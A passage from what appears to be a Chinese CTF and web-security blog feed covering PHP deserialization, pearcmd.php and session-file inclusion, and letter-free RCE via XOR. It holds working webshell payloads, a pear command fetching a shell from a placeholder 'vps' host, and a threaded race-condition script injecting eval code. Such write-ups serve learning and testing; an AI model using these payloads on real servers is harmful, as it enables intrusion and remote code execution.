<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$code</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no way, fuck off&quot;</span>;<br>    &#125;<br><span class="hljs-meta">?&gt;</span> <br><br></code></pre></td></tr></table></figure><p>这里和[羊城杯 2020]EasySer的题非常像</p><p>绕过就是把die给过了</p><p>然后思路就是给part1和part2分别进行伪协议写文件名和base64传木马</p><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Start</span>();<br><span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">CTF</span>();<br><span class="hljs-variable">$b</span>-&gt;part1=<span class="hljs-string">&#x27;php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php&#x27;</span>;<br><span class="hljs-variable">$b</span>-&gt;part2=<span class="hljs-string">&#x27;PD9waHAgc3lzdGVtKCJjYXQgL2YqIik7Pz4=&#x27;</span>;<br><span class="hljs-variable">$a</span>-&gt;barking=<span class="hljs-variable">$b</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>php反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pearcmd文件包含</title>
    <link href="/2023/10/23/Pearcmd%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <url>/2023/10/23/Pearcmd%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    
    <content type="html"><![CDATA[<h1 id="pearcmd文件包含"><a href="#pearcmd文件包含" class="headerlink" title="pearcmd文件包含"></a>pearcmd文件包含</h1><p>关于这个知识点的话第一次接触还是在buu的暑假挑战赛上，下面来记录一下。</p><h1 id="前置知识："><a href="#前置知识：" class="headerlink" title="前置知识："></a>前置知识：</h1><h2 id="1-register-argc-argv"><a href="#1-register-argc-argv" class="headerlink" title="1.register_argc_argv"></a>1.register_argc_argv</h2><p>当phpinfo中<strong>register_argc_argv</strong>是on时，**$_SERVER[‘argv’]**可以获得命令行参数。</p><p>如下图所示:</p><p><img src="https://s2.loli.net/2023/10/23/VjbcRmHpr36ANkF.png" alt="image-20231022185234849.png"></p><p>这里是用+进行一个分隔，而不是&amp;</p><h3 id="简单利用："><a href="#简单利用：" class="headerlink" title="简单利用："></a>简单利用：</h3><p>既然我们可以获得命令行参数的话，我们就可以进行一个命令执行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;argv&#x27;</span>]);<br><span class="hljs-variable">$a</span>=(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;argv&#x27;</span>]);<br><span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>](<span class="hljs-variable">$a</span>[<span class="hljs-number">1</span>]);<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>这里把a赋值成system，把1赋值成一个命令执行。</p><p><img src="https://s2.loli.net/2023/10/23/56sUAaKv3WTrDQd.png" alt="image-20231022185727273.png"></p><h1 id="pearcmd文件"><a href="#pearcmd文件" class="headerlink" title="pearcmd文件"></a>pearcmd文件</h1><p>利用的就是pearcmd.php中的pecl/pear</p><p>pecl是php中用于管理拓展而使用的命令行工具，pear是pecl所依赖的类库，在php7.3之前是默认安装的，而在php7.4版本及以后是需要指定-with-pear的。</p><p>不过在任意的docker镜像，pecl/pear都是默认安装的，路径在/usr/local/lib/php</p><p>pearcmd.php 文件的储存路径是 /usr/share/php/pearcmd.php</p><p>当执行了pear之后，就可以将$_SERVER[‘argv’]当成参数执行，如果有文件包含漏洞就可以包含pearcmd.php文件，如果可以出网的话就可以从服务器上读取shell文件，进行一个文件包含。</p><p>当然了，不出网也有不出网的用法，下面是对于不出网和出网的总结。</p><h2 id="出网"><a href="#出网" class="headerlink" title="出网"></a>出网</h2><p>pear可以拉远程的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">pear install -R /tmp http:<span class="hljs-comment">//vps/shell.php</span><br></code></pre></td></tr></table></figure><p>如果某一个文件包含是下面的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>那么出网的payload就是：?file=/usr/share/php/pearcmd.php&amp;+install+-R+/tmp+<a href="http://vps/shell.php">http://vps/shell.php</a></p><h2 id="不出网"><a href="#不出网" class="headerlink" title="不出网"></a>不出网</h2><p>pearcmd.php 文件里面有一个config-create</p><p>有两个参数，第一个参数是写入文件，第二个参数是设置的路径</p><p>所以在不出网的情况下就可以利用这个。</p><p>payload:?+config-create+/&amp;file=/usr/share/php/pearcmd.php(或者是pearcmd 如果文件包含后面有php这个后缀)&amp;/<?=eval($_GET[1])?>+/tmp/hello.php (这个的话随便设置了)</p><p>然后去访问/tmp/hello.php(当然如果文件包含的后缀带上了php，就去访问/tmp/hello)</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>文件包含</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>session文件包含</title>
    <link href="/2023/09/15/session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <url>/2023/09/15/session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    
    <content type="html"><![CDATA[<h1 id="session文件包含"><a href="#session文件包含" class="headerlink" title="session文件包含"></a>session文件包含</h1><p>参考文章：<a href="https://www.anquanke.com/post/id/201177#h2-1">https://www.anquanke.com/post/id/201177#h2-1</a></p><p>通过session包含的利用条件：<br>1.session文件路径已知</p><p>可以通过phpinfo()查看里面的sesion.save_path来获取</p><p>2.其中部分内容可控</p><p>下面来简单演示这个session文件包含</p><p>session.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;username&quot;</span>]=<span class="hljs-variable">$username</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$file</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>php中session默认是以文件形式进行储存的，文件名是sess_PHPSESSID 这个PHPSESSID是可以知道的，如果我们知道了session的储存位置，可以从phpinfo()中看到相关信息</p><p>并且里面的内容是我们可以控制的，我们就可以利用文件包含达到我们想要的。</p><p><img src="https://s2.loli.net/2023/09/15/tkfF3lU5YRdsXLh.png" alt="image-20230718172140755.png"></p><p><img src="https://s2.loli.net/2023/09/15/QPbLkUKo29fSYDG.png" alt="image-20230718172230624.png"></p><p><img src="https://s2.loli.net/2023/09/15/SbYqGraEfyHnp94.png" alt="image-20230718172351972.png"></p><p>上面的是session储存路径</p><p>以上只是最简单的进行一个利用，通常情况下，会对用户的会话信息进行一个编码，或者说没有session_start() 这样的情况下上面的情况就不能执行成功，所以我们就需要想办法进行绕过。</p><h1 id="下面是几种情况的绕过："><a href="#下面是几种情况的绕过：" class="headerlink" title="下面是几种情况的绕过："></a>下面是几种情况的绕过：</h1><h2 id="1-session经过base64编码"><a href="#1-session经过base64编码" class="headerlink" title="1.session经过base64编码"></a>1.session经过base64编码</h2><p>这种情况下一般想到的是对session解码就可以了，利用那个php伪协议，但是吧，由于base64的编码规则，我们并不能直接利用这个php伪协议，需要构造长度，让php伪协议去解码的时候，不影响后面的。</p><p>session.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;username&quot;</span>]=<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$username</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/09/15/rMeGND46xv2EfkB.png" alt="image-20230718183919467.png"></p><p>下面来讲一下这个base64的编码规则：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>.将传入的字符转换成<span class="hljs-number">2</span>进制 根据ascii进行划分 是<span class="hljs-number">8</span>位 （不满<span class="hljs-number">8</span>个高位补零）<br><span class="hljs-attribute">2</span>.将<span class="hljs-number">8</span>位的二进制进行<span class="hljs-number">6</span>位一组划分，因为<span class="hljs-number">2</span>^<span class="hljs-number">6</span>=<span class="hljs-number">64</span>  不满<span class="hljs-number">6</span>位的补零<br><span class="hljs-attribute">3</span>.总的比特数得是<span class="hljs-number">24</span>的倍数，<span class="hljs-number">6</span>和<span class="hljs-number">8</span>的最小公倍数是<span class="hljs-number">24</span> 不满足的补零，补的零转换成=<br><span class="hljs-attribute">4</span>.最后根据表格转换成字符串<br></code></pre></td></tr></table></figure><p><img src="https://p3.ssl.qhimg.com/t0178a983065875c97e.png" alt="img"></p><p><img src="https://p1.ssl.qhimg.com/t01eec8c9eb8ff18e75.png" alt="img"></p><p>经过base64编码过后的长度是原长度的4/3</p><p>编码了解了，下面看一下解码，解码和编码差不多，编码后的长度是原长度的3/4</p><p>所以是4个字节一组 这样才满足解码规则，之前的是只对session进行了编码，然后对所有的内容进行了解码，这样是错误的，所以我们根据解码的规则，构造长度，让前面的能够满足4位一组，让后面的session能够进行一个解码</p><p>username|s:24:” 我们这里使用的是php解释器，具体的请看session反序列化  由于base64解码只会对 A-Z，a-z,0-9 和/ + = 进行一个解码，其他的字符不会进行解码</p><p>所以上面的实际就是user name s24  共11个字符，还差一个，这时就在session传入那里构造其他的垃圾数据</p><p>让其满足username|s”xxx:”  就是3位数据</p><p><img src="https://s2.loli.net/2023/09/15/tRebZyTG78YQXPq.png" alt="image-20230718185352817.png"> </p><p><img src="https://s2.loli.net/2023/09/15/vR19d7kwZpMNyxT.png" alt="image-20230718185411245.png"></p><h2 id="2-No-session-start"><a href="#2-No-session-start" class="headerlink" title="2.No session_start()"></a>2.No session_start()</h2><p>首先要理解几个session中的配置是什么意思</p><p><img src="https://p2.ssl.qhimg.com/t018bf95c18fe0d3587.png" alt="img"></p><p>session.auto_start 这个键开启时，会自动进行session的初始化，但是一般情况下是默认关闭的。</p><p>session.upload_progress.cleanup 这个开启的时候表示当上传完成后php会立刻清理session文件的内容，这个跟后面的条件竞争有关</p><p>session.upload_progress_enabled 这个开启的时候，php能够在每一个文件上传时，检测其进度。只有这一个的话并没有什么，但是，同时POST一个跟ini中session.upload_progress_name相同名字的变量时，就会将进度信息保存在session中，这一部分数据是可以控制的，session就会自动进行初始化，索引是session.upload_progress.prefix和session.upload_prgress.name连接在一起的值</p><p><code>session.upload_progress.freq = &quot;1%&quot;</code>+<code>session.upload_progress.min_freq = &quot;1&quot;</code>：选项控制了上传进度信息应该多久被重新计算一次。 通过合理设置这两个选项的值，这个功能的开销几乎可以忽略不计。</p><p>session.use_strict_mode为0时，它的PHPSESSID的值是由我们自己定义的</p><p>综上所述，整体的一个思想就是session.uplaod_progress.name的值是可以控制的，同时POST传递时，会将其保存在session中，并且PHPSESSID的值是我们可以控制的，这样我们就可以恶意构造session.uplaod_progress.name的值，通过文件包含和条件竞争，来实现一个危害。</p><p>实现方法总共有两种，一种就是通过脚本跑，另一种就是通过bp</p><p>先来说通过bp的。</p><p>1，首先要构造一个上传表单</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!doctype <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://node4.anna.nssctf.cn:28342/index.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="hljs-attr">vaule</span>=<span class="hljs-string">&quot;&lt;?php phpinfo(); ?&gt;&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file1&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file2&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>上面的内容根据实际情况进行修改</p><p>2.修改PHPSESSID的值，发送到爆破板块</p><p><img src="https://s2.loli.net/2023/09/15/pjdLToiImzPtJ2c.png" alt="image-20230719113426206.png"></p><p>3.设置NULL payloads</p><p>4.将文件包含的也发送到bp爆破模块</p><p><img src="https://s2.loli.net/2023/09/15/jNzfqTe3o7UvO6l.png" alt="image-20230719113547926.png"></p><p>也设置NULL payloads 然后就可以去连接蚁剑了</p><p>方法2.通过脚本：<br>网上找的一个</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> io<br><span class="hljs-keyword">import</span> threading<br><br><span class="hljs-keyword">import</span> requests<br><br>sessid = <span class="hljs-string">&#x27;0&#x27;</span><br>target = <span class="hljs-string">&#x27;http://node4.anna.nssctf.cn:28071/&#x27;</span><br>file = <span class="hljs-string">&#x27;ph0ebus.txt&#x27;</span><br>f = io.BytesIO(<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">50</span>)<br><br>event = threading.Event()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write</span>(<span class="hljs-params">session</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> event.is_set():  <span class="hljs-comment"># 使用 event.is_set() 来判断是否需要继续执行</span><br>        session.post(target, data=&#123;<span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="hljs-string">&#x27;&lt;?php eval($_GET[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;,<br>                     files=&#123;<span class="hljs-string">&#x27;file&#x27;</span>: (file, f)&#125;, cookies=&#123;<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>: sessid&#125;)  <span class="hljs-comment"># 修改参数名为 cookies</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read</span>(<span class="hljs-params">session</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> event.is_set():  <span class="hljs-comment"># 使用 event.is_set() 来判断是否需要继续执行</span><br>        resp = session.get(<br>            <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;target&#125;</span>?mode=foo&amp;file=/tmp/sess_<span class="hljs-subst">&#123;sessid&#125;</span>&amp;cmd=system(&#x27;cd /;ls;cat nssctf*&#x27;);&quot;</span>)  <span class="hljs-comment"># 修改为 get 请求</span><br>        <span class="hljs-keyword">if</span> file <span class="hljs-keyword">in</span> resp.text:<br>            <span class="hljs-built_in">print</span>(resp.text)<br>            event.<span class="hljs-built_in">set</span>()  <span class="hljs-comment"># 如果成功读取到文件内容，设置 event，退出循环</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+]retry&quot;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    threads = []  <span class="hljs-comment"># 存储线程的列表</span><br>    <span class="hljs-keyword">with</span> requests.session() <span class="hljs-keyword">as</span> session:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">30</span>):<br>            t1 = threading.Thread(target=write, args=(session,))<br>            threads.append(t1)<br>            t1.start()<br><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">30</span>):<br>            t2 = threading.Thread(target=read, args=(session,))<br>            threads.append(t2)<br>            t2.start()<br><br>        <span class="hljs-comment"># 等待所有线程结束</span><br>        <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:<br>            t.join()<br><br>    event.<span class="hljs-built_in">set</span>()  <span class="hljs-comment"># 设置 event，以防止线程无法退出循环</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>文件包含</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>无数字字母RCE</title>
    <link href="/2023/08/25/%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DRCE/"/>
    <url>/2023/08/25/%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DRCE/</url>
    
    <content type="html"><![CDATA[<h1 id="无数字字母RCE"><a href="#无数字字母RCE" class="headerlink" title="无数字字母RCE"></a>无数字字母RCE</h1><h2 id="异或"><a href="#异或" class="headerlink" title="异或 ^"></a>异或 ^</h2><p>异或运算：相同为0 不同为1</p><p>两个字符的ascii码所对应的二进制进行一个异或运算</p><p>然后思想就是将两个字符串进行一个异或运算 结果就是我们想要得到的一个值</p><p>下面是一个php的异或运算的脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;content-type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$shell</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;cmd&quot;</span>];<br><span class="hljs-variable">$result1</span> = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-variable">$result2</span> = <span class="hljs-string">&quot;&quot;</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">judge</span>(<span class="hljs-params"><span class="hljs-variable">$c</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-z0-9]/is&#x27;</span>,<span class="hljs-variable">$c</span>))<br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$num</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$num</span>&lt;=<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$shell</span>);<span class="hljs-variable">$num</span>++)<br>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$x</span>=<span class="hljs-number">33</span>;<span class="hljs-variable">$x</span>&lt;=<span class="hljs-number">126</span>;<span class="hljs-variable">$x</span>++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">judge</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$x</span>)))<br>        &#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-variable">$y</span>=<span class="hljs-number">33</span>;<span class="hljs-variable">$y</span>&lt;=<span class="hljs-number">126</span>;<span class="hljs-variable">$y</span>++)<br>            &#123;<br>                <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">judge</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$y</span>)))<br>                &#123;<br>                    <span class="hljs-variable">$f</span> = <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$x</span>)^<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$y</span>);<br>                    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$f</span> == <span class="hljs-variable">$shell</span>[<span class="hljs-variable">$num</span>])<br>                    &#123;<br>                        <span class="hljs-variable">$result1</span> .= <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$x</span>);<br>                        <span class="hljs-variable">$result2</span> .= <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$y</span>);<br>                        <span class="hljs-keyword">break</span> <span class="hljs-number">2</span>;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;异或运算第一部分： &quot;</span>.<span class="hljs-variable">$result1</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;异或运算第二部分： &quot;</span>.<span class="hljs-variable">$result2</span>;<br>异或运算第一部分：<br>异或运算第二部分：<br></code></pre></td></tr></table></figure><p>还有一个python的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">valid = <span class="hljs-string">&quot;1234567890!@$%^*()&#123;&#125;[];\&#x27;\&quot;,.&lt;&gt;/?-=_`~ &quot;</span><br>answer = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入进行异或构造的字符串：&quot;</span>))<br>tmp1, tmp2 = <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> answer:<br>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> valid:<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> valid:<br>      <span class="hljs-keyword">if</span> (<span class="hljs-built_in">ord</span>(i) ^ <span class="hljs-built_in">ord</span>(j) == <span class="hljs-built_in">ord</span>(c)):<br>        tmp1 += i<br>        tmp2 += j<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>      <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;tmp1为:&quot;</span>,tmp1)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;tmp2为:&quot;</span>,tmp2)<br></code></pre></td></tr></table></figure><p>输入我们想要执行的就可以了</p><p>我们来看一下：</p><p><img src="https://s2.loli.net/2023/08/25/ejPVdK1hATQyo7C.png" alt="image-20230706202523452.png"></p><p><img src="https://s2.loli.net/2023/08/25/me9wrOgdAEplF42.png" alt="image-20230706203038189.png"></p><p>“运算第一部分”^”运算第二部分”  这里要进行一个url编码 因为加号会被当作空格 所以要进行一个url编码</p><p><strong>php5</strong>下可以用<code>assert($_POST[&#39;_&#39;]);</code> 进行一个命令执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">  <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;_&#x27;</span>]);    <br><span class="hljs-variable">$a</span>=assert;<br><span class="hljs-variable">$b</span>=_POST;<br><span class="hljs-variable">$c</span>=<span class="hljs-variable">$$b</span>;<br><span class="hljs-variable">$a</span>(<span class="hljs-variable">$c</span>[<span class="hljs-string">&#x27;_&#x27;</span>]);    <span class="hljs-comment">//让a=_   让b=__ 让c=___    //因为是无数字字母</span><br>    <span class="hljs-meta">?&gt;</span>     <span class="hljs-comment">// assert=&quot;!((%)(&quot;^&quot;@[[@[\\&quot;   _POST=&quot;!+/((&quot;^&quot;~&#123;`&#123;|&quot;   